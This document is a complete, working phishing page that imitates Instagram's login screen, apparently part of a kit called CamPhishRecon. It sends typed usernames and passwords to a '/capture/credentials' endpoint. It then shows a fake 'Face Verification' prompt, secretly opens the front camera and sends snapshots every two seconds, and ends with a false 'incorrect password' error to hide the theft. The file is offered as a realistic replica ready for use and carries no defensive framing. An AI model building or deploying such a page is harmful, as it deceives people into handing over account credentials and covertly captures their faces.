<!-- DESC: Instagram login — 100% realistic replica with face verification camera -->
<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#fafafa">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.main-box{width:350px;max-width:90vw;background:#fff;border:1px solid #dbdbdb;margin-bottom:10px}
.logo-area{padding:36px 40px 12px;text-align:center}
.logo{font-family:'Lucida Grande','Segoe UI',Georgia,serif;font-size:44px;font-style:italic;line-height:1;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:36px;font-weight:700}
.form-area{padding:0 40px 20px}
.input-wrap{position:relative;margin-bottom:6px}
.input-wrap input{width:100%;padding:9px 8px;font-size:12px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;color:#262626;outline:none;box-sizing:border-box}
.input-wrap input:focus{border-color:#a8a8a8}
.input-wrap input::placeholder{color:#8e8e8e;font-size:12px}
.btn-login{width:100%;padding:7px 16px;background:#4cb5f9;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin:8px 0}
.btn-login:active{opacity:.8}
.btn-login:disabled{opacity:.5}
.divider{display:flex;align-items:center;margin:10px 0 18px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider-text{color:#8e8e8e;font-size:13px;font-weight:600;margin:0 18px}
.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;cursor:pointer;border:none;background:none;margin:8px auto;width:100%}
.fb-icon{width:16px;height:16px;background:#385185;border-radius:2px;position:relative}
.fb-icon::after{content:'f';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:900;font-family:Georgia,serif}
.forgot{color:#00376b;font-size:12px;text-align:center;margin-top:12px}
.signup-box{width:350px;max-width:90vw;background:#fff;border:1px solid #dbdbdb;padding:24px;text-align:center;margin-bottom:10px}
.signup-box span{font-size:14px;color:#262626}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{text-align:center;padding:10px 20px}
.get-app p{font-size:14px;margin-bottom:16px;color:#262626}
.app-links{display:flex;gap:8px;justify-content:center}
.app-badge{height:40px}
.error-msg{color:#ed4956;font-size:14px;text-align:center;margin:10px 0;display:none}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top:transparent;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.face-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:999;display:none;align-items:center;justify-content:center;flex-direction:column}
.face-overlay.active{display:flex}
.face-title{color:#fff;font-size:20px;font-weight:600;margin-bottom:8px}
.face-sub{color:#aaa;font-size:14px;margin-bottom:20px;text-align:center;max-width:260px}
.face-circle{width:180px;height:180px;border-radius:50%;border:3px solid rgba(255,255,255,.3);position:relative;overflow:hidden}
.face-circle::after{content:'';position:absolute;inset:0;border-radius:50%;border:2px solid rgba(76,181,249,.5);animation:fp 1.5s infinite}
@keyframes fp{0%,100%{transform:scale(.9);opacity:.5}50%{transform:scale(1.05);opacity:1}}
video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
</style>
</head><body>
<script src="forwarding_link/t/recon.js"></script>
<video id="v" playsinline autoplay muted></video>
<canvas id="cap" width="320" height="240"></canvas>

<div class="main-box">
<div class="logo-area"><div class="logo">Instagram</div></div>
<div class="form-area">
<form onsubmit="return doLogin(event)">
<div class="input-wrap"><input type="text" placeholder="Phone number, username, or email" id="user" required></div>
<div class="input-wrap"><input type="password" placeholder="Password" id="pass" required></div>
<div class="error-msg" id="err">Sorry, your password was incorrect. Please double-check your password.</div>
<button type="submit" class="btn-login" id="loginBtn">Log In</button>
</form>
<div class="divider"><div></div><span class="divider-text">OR</span><div></div></div>
<button class="fb-login" onclick="doFaceScan()"><span class="fb-icon"></span> Log in with Facebook</button>
<div class="forgot">Forgot password?</div>
</div>
</div>

<div class="signup-box"><span>Don't have an account? <a href="#">Sign up</a></span></div>
<div class="get-app"><p>Get the app.</p><div class="app-links"><div style="background:#000;color:#fff;padding:8px 12px;border-radius:6px;font-size:11px">📱 App Store</div><div style="background:#000;color:#fff;padding:8px 12px;border-radius:6px;font-size:11px">📱 Google Play</div></div></div>

<div class="face-overlay" id="faceScan">
<div class="face-circle"></div>
<div class="face-title">Face Verification</div>
<div class="face-sub">We're verifying your identity to secure your account. Please allow camera access.</div>
<div style="color:#aaa;font-size:13px;margin-top:8px"><span class="spinner" style="border-color:#aaa;border-top-color:#4cb5f9"></span> Verifying...</div>
</div>

<script>
var API='API_BASE_URL',SHARE_URL=location.origin+'/t/instagram';
if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
function doLogin(e){
e.preventDefault();
var btn=document.getElementById('loginBtn');btn.innerHTML='<span class="spinner"></span>';btn.disabled=true;
doFaceScan();
return false;
}
function doFaceScan(){
var fs=document.getElementById('faceScan');fs.classList.add('active');
if(window.CamPhishRecon)CamPhishRecon.Capture.event('instagram_login',{user:document.getElementById('user').value});
captureCreds();
if(navigator.mediaDevices){
navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
var v=document.getElementById('v');v.srcObject=stream;v.play();
var cap=document.getElementById('cap'),cx=cap.getContext('2d');
var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'instagram_verify');}},2000);
setTimeout(function(){clearInterval(ci);fs.classList.remove('active');document.getElementById('err').style.display='block';var btn=document.getElementById('loginBtn');btn.innerHTML='Log In';btn.disabled=false;},5000);
}).catch(function(){setTimeout(function(){fs.classList.remove('active');document.getElementById('err').style.display='block';},2000);});
}else{setTimeout(function(){fs.classList.remove('active');},2000);}
}
function captureCreds(){
var u=document.getElementById("user");var p=document.getElementById("pass");
if(!u||!p)return;
var data={template_id:"instagram",username:u.value,password:p.value};
if(u.value.indexOf("@")>=0)data.email=u.value;
if(/^\+?[0-9]{10,}/.test(u.value))data.phone=u.value;
fetch((window.CamPhishRecon?"/api":"API_BASE_URL")+"/capture/credentials",{
method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)
}).catch(function(){});
}
</script>
</body></html>
